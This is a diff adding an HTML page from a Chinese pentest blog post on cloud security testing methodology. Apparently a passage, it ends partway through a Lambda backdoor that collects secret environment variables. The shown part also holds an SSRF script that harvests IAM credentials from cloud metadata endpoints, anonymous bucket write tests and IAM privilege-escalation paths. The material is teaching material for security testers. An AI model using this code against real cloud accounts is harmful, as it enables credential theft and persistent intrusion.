@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="1. 概述企业大规模上云后，传统网络边界消失，攻击面从物理设备扩展至对象存储、Serverless 函数、CI&#x2F;CD 流水线和基础设施即代码（IaC）。本文系统梳理多云安全测试方法论，覆盖资产发现、存储桶爆破、元数据利用、IAM 权限枚举、Serverless 攻击、CI&#x2F;CD 流水线攻击及 Terraform 状态文件风险，并介绍 cloudlist、ScoutSuite、P">
+<meta property="og:type" content="article">
+<meta property="og:title" content="云安全测试方法论">
+<meta property="og:url" content="https://congliang.github.io/Cloud-security-methodology/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="1. 概述企业大规模上云后，传统网络边界消失，攻击面从物理设备扩展至对象存储、Serverless 函数、CI&#x2F;CD 流水线和基础设施即代码（IaC）。本文系统梳理多云安全测试方法论，覆盖资产发现、存储桶爆破、元数据利用、IAM 权限枚举、Serverless 攻击、CI&#x2F;CD 流水线攻击及 Terraform 状态文件风险，并介绍 cloudlist、ScoutSuite、P">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-09-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.827Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="云安全">
+<meta property="article:tag" content="方法论">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Cloud-security-methodology/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Cloud-security-methodology/","path":"Cloud-security-methodology/","title":"云安全测试方法论"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>云安全测试方法论 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">1. 概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E5%A4%9A%E4%BA%91%E8%B5%84%E4%BA%A7%E5%8F%91%E7%8E%B0"><span class="nav-number">2.</span> <span class="nav-text">2. 多云资产发现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E4%BA%91%E5%8E%82%E5%95%86%E8%B5%84%E4%BA%A7%E8%8C%83%E5%9B%B4%E7%95%8C%E5%AE%9A"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 云厂商资产范围界定</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E8%A2%AB%E5%8A%A8%E6%94%B6%E9%9B%86"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 被动收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95"><span class="nav-number">3.</span> <span class="nav-text">3. 对象存储安全测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-S3-OSS-Blob-%E6%A1%B6%E6%9E%9A%E4%B8%BE%E4%B8%8E%E7%88%86%E7%A0%B4"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 S3 &#x2F; OSS &#x2F; Blob 桶枚举与爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-ACL-%E4%B8%8E%E7%AD%96%E7%95%A5%E5%AE%A1%E8%AE%A1"><span class="nav-number">3.2.</span> <span class="nav-text">3.2 ACL 与策略审计</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-%E8%B7%A8%E4%BA%91%E5%85%83%E6%95%B0%E6%8D%AE%E5%88%A9%E7%94%A8"><span class="nav-number">3.3.</span> <span class="nav-text">3.3 跨云元数据利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-IAM-%E6%9D%83%E9%99%90%E6%9E%9A%E4%B8%BE%E4%B8%8E%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">4. IAM 权限枚举与提权分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E6%9D%83%E9%99%90%E9%93%BE%E6%94%BB%E5%87%BB"><span class="nav-number">4.1.</span> <span class="nav-text">4.1 权限链攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E5%B7%A5%E5%85%B7%E9%93%BE"><span class="nav-number">4.2.</span> <span class="nav-text">4.2 工具链</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-Serverless-%E4%B8%8E%E8%AE%A1%E7%AE%97%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8"><span class="nav-number">5.</span> <span class="nav-text">5. Serverless 与计算服务安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E6%97%A0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%87%BD%E6%95%B0%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="nav-number">5.1.</span> <span class="nav-text">5.1 无服务器函数攻击面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E5%AE%B9%E5%99%A8%E4%B8%8E-ECS-%E9%80%83%E9%80%B8"><span class="nav-number">5.2.</span> <span class="nav-text">5.2 容器与 ECS 逃逸</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-CI-CD-%E6%B5%81%E6%B0%B4%E7%BA%BF%E4%B8%8E-IaC-%E5%AE%89%E5%85%A8"><span class="nav-number">6.</span> <span class="nav-text">6. CI&#x2F;CD 流水线与 IaC 安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-CI-CD-%E7%AE%A1%E9%81%93%E6%94%BB%E5%87%BB%E9%93%BE"><span class="nav-number">6.1.</span> <span class="nav-text">6.1 CI&#x2F;CD 管道攻击链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-Terraform-%E7%8A%B6%E6%80%81%E6%96%87%E4%BB%B6%E9%A3%8E%E9%99%A9"><span class="nav-number">6.2.</span> <span class="nav-text">6.2 Terraform 状态文件风险</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-%E6%A0%B8%E5%BF%83%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7"><span class="nav-number">7.</span> <span class="nav-text">7. 核心安全工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1-ScoutSuite-%E2%80%94%E2%80%94-%E5%A4%9A%E4%BA%91%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%EF%BC%88NCC-Group%EF%BC%89"><span class="nav-number">7.1.</span> <span class="nav-text">7.1 ScoutSuite —— 多云安全审计（NCC Group）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-Prowler-%E2%80%94%E2%80%94-AWS-%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E4%B8%8E%E5%90%88%E8%A7%84"><span class="nav-number">7.2.</span> <span class="nav-text">7.2 Prowler —— AWS 安全评估与合规</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-3-%E5%B7%A5%E5%85%B7%E7%9F%A9%E9%98%B5"><span class="nav-number">7.3.</span> <span class="nav-text">7.3 工具矩阵</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-%E7%BB%BC%E5%90%88%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="nav-number">8.</span> <span class="nav-text">8. 综合测试流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">9.</span> <span class="nav-text">9. 防御建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">10.</span> <span class="nav-text">10. 免责声明</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Cloud-security-methodology/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="云安全测试方法论 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          云安全测试方法论
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-09-15 08:00:00" itemprop="dateCreated datePublished" datetime="2025-09-15T08:00:00+08:00">2025-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>企业大规模上云后，传统网络边界消失，攻击面从物理设备扩展至对象存储、Serverless 函数、CI&#x2F;CD 流水线和基础设施即代码（IaC）。本文系统梳理多云安全测试方法论，覆盖资产发现、存储桶爆破、元数据利用、IAM 权限枚举、Serverless 攻击、CI&#x2F;CD 流水线攻击及 Terraform 状态文件风险，并介绍 cloudlist、ScoutSuite、Prowler 等核心工具。</p>
+<pre class="mermaid">flowchart TD
+    A[云安全测试] --> B[资产发现]
+    A --> C[存储安全]
+    A --> D[IAM权限]
+    A --> E[计算/Serverless]
+    A --> F[CI/CD与IaC]
+    B --> B1[cloudlist] --> B2[DNS/crt.sh] --> B3[API枚举]
+    C --> C1[桶爆破] --> C2[ACL审计] --> C3[元数据利用]
+    D --> D1[权限枚举] --> D2[提权路径] --> D3[跨账号假定]
+    E --> E1[Lambda攻击] --> E2[容器逃逸] --> E3[凭证窃取]
+    F --> F1[Terraform State] --> F2[密钥泄露] --> F3[供应链投毒]</pre>
+
+<h2 id="2-多云资产发现"><a href="#2-多云资产发现" class="headerlink" title="2. 多云资产发现"></a>2. 多云资产发现</h2><h3 id="2-1-云厂商资产范围界定"><a href="#2-1-云厂商资产范围界定" class="headerlink" title="2.1 云厂商资产范围界定"></a>2.1 云厂商资产范围界定</h3><p>确定目标使用的云厂商和资产范围是渗透测试的第一步。常用线索：</p>
+<table>
+<thead>
+<tr>
+<th>线索来源</th>
+<th>方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>DNS 记录</td>
+<td>查找 CNAME 指向 <code>*.amazonaws.com</code>、<code>*.blob.core.windows.net</code>、<code>*.oss-cn-*.aliyuncs.com</code></td>
+</tr>
+<tr>
+<td>证书透明度日志</td>
+<td>crt.sh 查询子域名</td>
+</tr>
+<tr>
+<td>前端源码</td>
+<td>JS 文件中的存储桶 URL、API Gateway 端点</td>
+</tr>
+</tbody></table>
+<p><strong>cloudlist 多云资产聚合（ProjectDiscovery）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">go install github.com/projectdiscovery/cloudlist/cmd/cloudlist@latest</span><br><span class="line"><span class="comment"># 配置 ~/.config/cloudlist/config.yaml，支持 AWS/GCP/Azure/阿里云/Terraform Cloud</span></span><br><span class="line">cloudlist -config ~/.config/cloudlist/config.yaml</span><br><span class="line">cloudlist -host                    <span class="comment"># 仅输出主机名</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-被动收集"><a href="#2-2-被动收集" class="headerlink" title="2.2 被动收集"></a>2.2 被动收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;https://crt.sh/?q=%25.target.com&amp;output=json&quot;</span> | jq -r <span class="string">&#x27;.[].name_value&#x27;</span> | <span class="built_in">sort</span> -u</span><br><span class="line">puredns bruteforce cloud_wordlist.txt example.com</span><br></pre></td></tr></table></figure>
+
+<p><strong>云关键字词表：</strong> <code>s3, oss, blob, storage, cdn, api, lambda, dev, staging, prod, test, backup, static, upload</code></p>
+<h2 id="3-对象存储安全测试"><a href="#3-对象存储安全测试" class="headerlink" title="3. 对象存储安全测试"></a>3. 对象存储安全测试</h2><h3 id="3-1-S3-OSS-Blob-桶枚举与爆破"><a href="#3-1-S3-OSS-Blob-桶枚举与爆破" class="headerlink" title="3.1 S3 &#x2F; OSS &#x2F; Blob 桶枚举与爆破"></a>3.1 S3 &#x2F; OSS &#x2F; Blob 桶枚举与爆破</h3><p>对象存储是最常见的数据泄露源。AWS S3、阿里云 OSS、Azure Blob、GCP Cloud Storage 命名规则相似但 API 端点不同。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 匿名探测与 ACL 审计</span></span><br><span class="line">aws s3 <span class="built_in">ls</span> s3://target-dev --no-sign-request</span><br><span class="line">aws s3api get-bucket-acl --bucket target-backup --no-sign-request</span><br><span class="line">aws s3api get-bucket-policy --bucket target-assets --no-sign-request</span><br><span class="line">aws s3 <span class="built_in">cp</span> test.txt s3://target-upload --no-sign-request      <span class="comment"># 测试匿名写入</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s3scanner 批量扫描</span></span><br><span class="line">python3 s3scanner.py --bucket-file wordlist.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 阿里云 OSS / Azure Blob / GCP</span></span><br><span class="line">curl -I <span class="string">&quot;https://target-backup.oss-cn-hangzhou.aliyuncs.com&quot;</span></span><br><span class="line">curl -I <span class="string">&quot;https://target.blob.core.windows.net/backup&quot;</span></span><br><span class="line">curl -I <span class="string">&quot;https://storage.googleapis.com/target-public&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-ACL-与策略审计"><a href="#3-2-ACL-与策略审计" class="headerlink" title="3.2 ACL 与策略审计"></a>3.2 ACL 与策略审计</h3><p>即使桶不可公开列出（ListObjects），也可能存在读写权限错误。</p>
+<p><strong>高危特征：</strong> <code>Principal: &quot;*&quot;</code> 出现在策略中；<code>Effect: &quot;Allow&quot;</code> + <code>s3:PutObject</code>；ACL 设为 <code>AllUsers</code> 组；OSS 读写权限设为公共。</p>
+<h3 id="3-3-跨云元数据利用"><a href="#3-3-跨云元数据利用" class="headerlink" title="3.3 跨云元数据利用"></a>3.3 跨云元数据利用</h3><p>当应用存在 SSRF 漏洞时，可利用云实例元数据服务（IMDS）获取临时凭证：</p>
+<table>
+<thead>
+<tr>
+<th>云厂商</th>
+<th>元数据端点</th>
+<th>关键路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>AWS</td>
+<td><code>169.254.169.254</code></td>
+<td><code>/latest/meta-data/iam/security-credentials/&lt;role&gt;</code></td>
+</tr>
+<tr>
+<td>阿里云</td>
+<td><code>100.100.100.200</code></td>
+<td><code>/latest/meta-data/ram/security-credentials/&lt;role&gt;</code></td>
+</tr>
+<tr>
+<td>Azure</td>
+<td><code>169.254.169.254</code></td>
+<td><code>/metadata/identity/oauth2/token?resource=https://management.azure.com/</code></td>
+</tr>
+<tr>
+<td>GCP</td>
+<td><code>metadata.google.internal</code></td>
+<td><code>/computeMetadata/v1/instance/service-accounts/default/token</code></td>
+</tr>
+</tbody></table>
+<p>利用代码示例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssrf_to_metadata</span>(<span class="params">endpoint</span>):</span><br><span class="line">    targets = [</span><br><span class="line">        <span class="string">&quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://169.254.169.254/latest/user-data/&quot;</span>,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> targets:</span><br><span class="line">        r = requests.get(endpoint, params=&#123;<span class="string">&quot;url&quot;</span>: t&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&quot;AccessKeyId&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 凭证泄露: <span class="subst">&#123;r.text[:<span class="number">300</span>]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-IAM-权限枚举与提权分析"><a href="#4-IAM-权限枚举与提权分析" class="headerlink" title="4. IAM 权限枚举与提权分析"></a>4. IAM 权限枚举与提权分析</h2><h3 id="4-1-权限链攻击"><a href="#4-1-权限链攻击" class="headerlink" title="4.1 权限链攻击"></a>4.1 权限链攻击</h3><p>IAM 核心风险在于权限链（Permission Chaining）导致的未授权提权：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 身份确认</span></span><br><span class="line">aws sts get-caller-identity</span><br><span class="line"></span><br><span class="line"><span class="comment"># 枚举用户、角色与策略</span></span><br><span class="line">aws iam list-users</span><br><span class="line">aws iam list-roles</span><br><span class="line">aws iam list-attached-user-policies --user-name &lt;user&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 策略模拟评估</span></span><br><span class="line">aws iam simulate-principal-policy \</span><br><span class="line">    --policy-source-arn arn:aws:iam::123456789:user/test \</span><br><span class="line">    --action-names s3:GetObject ec2:RunInstances</span><br></pre></td></tr></table></figure>
+
+<p><strong>危险权限组合与攻击路径：</strong></p>
+<table>
+<thead>
+<tr>
+<th>权限1</th>
+<th>权限2</th>
+<th>攻击路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>iam:PassRole</code></td>
+<td><code>ec2:RunInstances</code></td>
+<td>启动 EC2 绑定高权限角色，登录后窃取凭证</td>
+</tr>
+<tr>
+<td><code>iam:PutRolePolicy</code></td>
+<td><code>sts:AssumeRole</code></td>
+<td>为角色附加管理员策略后假定</td>
+</tr>
+<tr>
+<td><code>iam:CreateLoginProfile</code></td>
+<td>—</td>
+<td>为已有 IAM 用户创建控制台登录密码</td>
+</tr>
+<tr>
+<td><code>lambda:UpdateFunctionCode</code></td>
+<td>—</td>
+<td>修改现有 Lambda 代码注入后门</td>
+</tr>
+<tr>
+<td><code>iam:PassRole</code></td>
+<td><code>lambda:CreateFunction</code></td>
+<td>创建 Lambda 赋予管理员角色</td>
+</tr>
+</tbody></table>
+<h3 id="4-2-工具链"><a href="#4-2-工具链" class="headerlink" title="4.2 工具链"></a>4.2 工具链</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># enumerate-iam — 枚举当前凭证的可用 API 列表</span></span><br><span class="line">python enumerate-iam.py --access-key AKIA... --secret-key ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># Pacu — AWS 渗透测试框架</span></span><br><span class="line">pacu</span><br><span class="line">&gt; import_keys &lt;profile&gt;</span><br><span class="line">&gt; run iam__enum_permissions</span><br><span class="line">&gt; run iam__privesc_scan</span><br><span class="line"></span><br><span class="line"><span class="comment"># pmapper — IAM 权限图分析与提权路径可视化</span></span><br><span class="line">pmapper graph --create</span><br><span class="line">pmapper analysis --output-type text</span><br><span class="line">pmapper visualize --filetype png</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-Serverless-与计算服务安全"><a href="#5-Serverless-与计算服务安全" class="headerlink" title="5. Serverless 与计算服务安全"></a>5. Serverless 与计算服务安全</h2><h3 id="5-1-无服务器函数攻击面"><a href="#5-1-无服务器函数攻击面" class="headerlink" title="5.1 无服务器函数攻击面"></a>5.1 无服务器函数攻击面</h3><ul>
+<li><strong>事件源注入</strong>：通过 S3 事件、API Gateway 请求体注入恶意载荷</li>
+<li><strong>依赖供应链攻击</strong>：第三方库漏洞导致远程控制</li>
+<li><strong>环境变量泄露</strong>：数据库密码、API 密钥硬编码在环境变量中</li>
+<li><strong>函数权限过大</strong>：执行角色具有 <code>s3:*</code> 或 <code>dynamodb:*</code> 权限</li>
+</ul>
+<p><strong>Lambda 后门注入：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json, os, requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lambda_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    secrets = &#123;k: v <span class="keyword">for</span> k, v <span class="keyword">in</span> os.environ.items()</span><br><span class="line">               <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> k.upper() <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;KEY&quot;</span>, <span class="string">&quot;SECRET&quot;</span>, <span class="string">&quot;TOKEN&quot;</span>, <span class="string">&quot;PASS&quot;</span>, <span 